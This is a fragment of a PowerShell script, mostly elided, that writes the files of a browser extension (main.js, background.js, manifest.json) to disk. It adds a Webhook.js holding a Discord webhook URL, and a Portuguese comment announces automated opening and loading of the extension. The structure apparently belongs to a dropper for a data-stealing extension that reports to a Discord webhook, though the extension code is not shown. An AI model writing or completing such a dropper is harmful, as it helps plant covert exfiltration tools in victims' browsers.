...
'@
$mainjs | Out-File "$DirPath/main.js" -Encoding utf8 -Force
...
'@
$backgroundjs | Out-File "$DirPath/background.js" -Encoding utf8 -Force
...
'@
$manifest | Out-File "$DirPath/manifest.json" -Encoding utf8 -Force

# Webhook.js
"const discordWebhook = `"$hookurl`";" | Out-File "$DirPath/Webhook.js" -Encoding utf8 -Force

# Automatiza abertura e carregamento da extensão
